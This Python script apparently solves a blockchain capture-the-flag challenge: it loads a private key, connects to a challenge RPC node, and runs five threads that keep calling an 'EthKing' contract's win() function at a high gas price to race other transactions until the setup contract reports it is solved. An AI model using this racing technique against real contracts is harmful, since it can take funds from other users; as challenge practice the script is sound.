from dotenv import load_dotenv
from web3.middleware import SignAndSendRawMiddlewareBuilder
from web3 import Web3
import eth_account
import json
import os
import threading
import time

def get_abi(path):
    with open(path, "r") as f:
        data = json.loads(f.read())
    return data['abi']

load_dotenv()
SETUP_ADDR = os.getenv("CHALLENGE_CONTRACT")
PRIVATE_KEY = os.getenv("PRIVATE_KEY")
# RPC_URL = "http://127.0.0.1:8545"
RPC_URL = "http://146.190.83.95:42222/7fd6635a-5525-4341-85cf-4f8202856317"

w3 = Web3(Web3.HTTPProvider(RPC_URL))

solver = eth_account.Account.from_key(PRIVATE_KEY)
w3.middleware_onion.inject(SignAndSendRawMiddlewareBuilder.build(solver), layer=0)
print("Using Account: ", solver.address)

setup_abi = get_abi("./out/Setup.sol/Setup.json")
setup_contract = w3.eth.contract(abi=setup_abi, address=SETUP_ADDR)

ETHKING_ADDR = setup_contract.functions.ethking().call()
ethking_abi = get_abi("./out/EthKing.sol/EthKing.json")
ethking_contract = w3.eth.contract(abi=ethking_abi, address=ETHKING_ADDR)

def race_win():
    while True:
        try:
            tx_hash = ethking_contract.functions.win().transact({
                'from': solver.address,
                'value': Web3.to_wei(0.001, 'ether'),
                "gasPrice": Web3.to_wei(200, 'gwei')
            })
            tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            print(tx_receipt)
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)

threads = []
for i in range(5):
    t = threading.Thread(target=race_win, daemon=True)
    threads.append(t)
    t.start()

while True:
    try:
        solved = setup_contract.functions.isSolved().call()
        print("solved?", solved)
        print("solver balance", w3.eth.get_balance(solver.address))
        if solved: break
        time.sleep(1)
    except:
        pass